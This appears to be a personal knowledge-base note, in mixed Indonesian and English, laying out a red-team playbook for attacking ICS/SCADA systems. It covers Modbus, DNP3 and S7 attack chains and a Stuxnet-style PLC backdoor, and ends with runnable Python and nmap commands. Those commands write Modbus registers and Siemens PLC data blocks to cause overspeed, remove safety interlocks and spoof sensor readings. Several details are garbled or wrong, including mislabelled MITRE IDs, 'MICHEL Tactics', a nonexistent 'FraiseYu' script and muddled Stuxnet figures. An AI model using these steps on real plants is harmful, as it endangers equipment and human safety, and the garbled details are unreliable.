---
title: Attack Perspective — ICS/SCADA (Red Team OT)
tags:
- attack
- red-team
- ics
- scada
- plc
- modbus
- dnp3
- stuxnet
- ot
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - wide-table
  - callout
---

# ICS/SCADA — Perspektif Penyerang (OT)

> OT beda dari IT: protokol tanpa auth (Modbus, DNP3), PLC = fisik, patch = boot window sempit. Red team: protocol inject → PLC command → physical impact. Model: Stuxnet, Industroyer, Triton.

## 1. Attack Surface OT

| Komponen | Vektor | MITRE ID (ICS) | Tool / Teknik | Evasion | Detection Gap |
|----------|--------|---------------|---------------|---------|----------------|
| **Modbus TCP** | Write coil/register → physical control | T0831 (Manipulate I/O) | modbus-cli, ModbusPal | No auth = silent command | ICS monitoring = rare |
| **DNP3** | Command inject, config tamper | T0855 | OpenDNP3, dnplib | No auth (legacy) | DNP3 audit = rare |
| **IEC 104** | SCADA command inject | T0831 | IEC-104 fuzz, Python | No auth | ICS IDS = rare |
| **PLC** | Firmware modify → persistent backdoor | T0839 (Modify Alarm) | Stuxnet pattern, custom | PLC firmware = trusted | PLC audit = rare |
| **HMI** | Operator screen spoof → misjudge | T0855 (Unauthorized Command) | HMI exploit, screen inject | Operator trust = social | HMI audit = rare |
| **RTU** | Relay command → grid control | T0831 | RTU protocol fuzz | No auth legacy | Grid audit = rare |
| **Historian** | Data tamper → false analysis | T0809 (Data Destruction) | DB insert/modify | Historian = trusted | Historian audit = rare |
| **Engineering WS** | Ladder logic modify → PLC reprogram | T0839 | TIA Portal, RSLogix, Codesys | Ladder = trusted | Change audit = rare |

## 2. Modbus Attack Chain

```
Recon: Shodan port 502 → exposed Modbus device
  ├── scan: nmap -p 502 --script modbus-discover
  └→ Identify: unit ID, function code, register range
    ↓
Read: modbus read → map register → process value
  ├── FC03: read holding register → setpoint, status
  ├── FC04: read input register → sensor value
  └→ Understand: process layout, critical register
    ↓
Inject: modbus write → register change
  ├── FC05: force single coil → on/off
  ├── FC06: write single register → setpoint change
  ├── FC15: force multiple coils → batch control
  └→ FC16: write multiple registers → full override
    ↓
Physical Impact:
  ├── Pump speed → overspeed → damage
  ├── Valve position → flow change → pressure spike
  ├── Setpoint → beyond safety limit → trip
  └→ Fake sensor value → operator misjudge
    ↓
Evasion: Modbus = no auth, no logging → silent (jika ICS monitor tidak ada)
```

## 3. PLC Backdoor (Stuxnet Pattern)

```
Initial Access: Engineering workstation / USB / network hop
    ↓
Ladder Logic Extraction:
  ├── TIA Portal / RSLogix → connect PLC → upload
  ├── Identify: safety logic, interlock, control loop
  └→ Map: normal vs safe state
    ↓
Modify:
  ├── Change setpoint frequency (centrifuge → overspeed)
  ├── Remove interlock (safety bypass)
  ├── Inject false sensor (hide out-of-range)
  └→ Hide: PLC display = normal value
    ↓
Deploy: Download ke PLC → physical control
    ↓
Stealth:
  ├── PLC logic = trusted → no audit
  ├── Physical trip → operator blame equipment
  └→ Recovery: ladder logic verify = manual
```

## 4. TTP MITRE ICS Mapping

| MICHEL Tactics | Attack | Detection Gap |
|-----|--------|----------------|
| Initial Access | Remote service, external remote | OT perimeter = weak |
| Execution | Modify controller logic, change program state | PLC = trusted |
| Persistence | Project file infec, firmware modify | Firmware = no verify |
| Evasion | Rootkit, spoof reporting | OT monitoring = rare |
| Discovery | Network scan, PLC enumerate | OT IDS = rare |
| Lateral | Engineering WS → PLC → HMI | Flat OT network |
| Impact | Manipulate I/O, damage, DoS | Physical impact = late detect |

## 5. Tool Stack

| Tool | Use |
|------|-----|
| **modbus-cli** | Modbus read/write |
| **ModbusPal** | Modbus simulation + attack |
| **OpenDNP3** | DNP3 read/write |
| **Scapy (Modbus/DNP3)** | Protocol fuzz + inject |
| **PLCscan** | PLC discovery |
| **GRASSMARLIN** | OT network mapping |

## 6. Referensi
- MITRE ATT&CK ICS — https://attack.mitre.org/matrices/ics/
- ICS-CERT (CISA) — https://www.cisa.gov/ics
- Stuxnet Analysis — https://www.welivesecurity.com/2011/01/17/...
- Modbus Protocol — https://modbus.org/
- SANS ICS — https://www.sans.org/ics/

## Konkret — ICS/SCADA Payload (Testable)

### Modbus TCP (Port 502, No Auth)

```bash
# Install modbus client
pip install pyModbusTCP

# Read holding register (coil/input)
python3 -c "
from pyModbusTCP.client import ModbusClient
c = ModbusClient(host='target', port=502)
c.open()
# Read 10 holding register dari address 0
regs = c.read_holding_registers(0, 10)
print(regs)
# Write register 0 = 1 (modify relay/status)
c.write_single_register(0, 1)
c.close()
"

# ModbusScan / mbtget (CLI tools)
mbtget -a 1 -r 0 -c 10 target_ip
```

### DNP3 (Port 20000, No Auth)

```bash
# DNP3是没有 authentication di banyak instalasi legacy
# FraiseYu (Nmap NSE):
nmap -p 20000 --script dnp3-enumerate target
# Output: outstation address, point index, values

# DNP3 write (modify analog output):
python3 dnp3_client.py --target target --write --index 0 --value 100
```

### S7comm (Siemens, Port 102)

```bash
# Snap7 / s7comm-level attack
nmap -p 102 --script s7-info target   # enumerate PLC
# Output: module, firmware, serial

# Python-snap7:
import snap7
plc = snap7.client.Client()
plc.connect('target', 0, 1)
# Read DB (data block)
data = plc.db_read(1, 0, 10)  # read DB1, offset 0, size 10
# Write DB → modify PLC logic!
plc.db_write(1, 0, b'\x01\x00\x00\x00')
```

### Stuxnet Cascade Pattern

```
1. Infeksi USB drive (LNK file + DLL)        [stage 0]
2. Masuk PLC Step 7 project machine         [stage 1]
3. Cari target S7-315/415 PLC               [stage 2]
4. Modify code block OB35 (417 logic mod)   [stage 3]
   → Frequency controller rot valve bypass
   → 1410Hz (safe) → 2Hz (centrifuge rusak)
5. Send fake feedback (0x0001) → operator tidak aware
6. Duplicate di 5 facility → multi-site outbreak
```
---

audited
---
